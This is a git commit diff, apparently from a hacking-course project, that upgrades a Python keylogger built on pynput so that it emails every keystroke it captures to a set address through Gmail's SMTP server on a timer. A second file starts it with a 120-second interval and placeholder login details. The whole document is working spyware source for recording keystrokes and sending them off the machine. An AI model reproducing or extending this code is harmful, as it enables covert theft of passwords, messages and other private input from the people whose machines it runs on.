43769de55a30879acbbe9e4726e2b52035efff23
kali-ninja <kali-ninja@kali-ninja.kali-ninja>
2025-03-25 23:27:03 +0100

    done

--- keylogger.py
+++ keylogger.py
@@ -1,11 +1,14 @@
 #!/usr/bin/env python3
-
+import smtplib
 import pynput.keyboard
 import threading
 
 class Keylogger:
-    def __init__(self):
-        self.log = ""
+    def __init__(self, time_interval, email, password):
+        self.log = "Keylogger started"
+        self.interval = time_interval
+        self.email = email
+        self.password = password
 
     def append_to_log(self, string):
         self.log = self.log + string
@@ -18,13 +21,20 @@ class Keylogger:
                 current_key = " "
             else:
                 current_key = " " + str(key) + " "
-        self.append_to_log((current_key))
+        self.append_to_log(current_key)
 
     def report(self):
-        print(self.log)
+        self.send_mail(self.email, self.password, "\n\n" + self.log)
         self.log = ""
-        timer = threading.Timer(5, self.report)
+        timer = threading.Timer(self.interval, self.report)
         timer.start()
+
+    def send_mail(self, email, password, message):
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
 
     def start(self):
         keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
--- zlogger.py
+++ zlogger.py
@@ -1,6 +1,5 @@
 #!/usr/bin/env python3
-
 import keylogger
 
-my_keylogger = keylogger.Keylogger()
+my_keylogger = keylogger.Keylogger(120, "johndoe@email.com", "johndoe")
 my_keylogger.start()
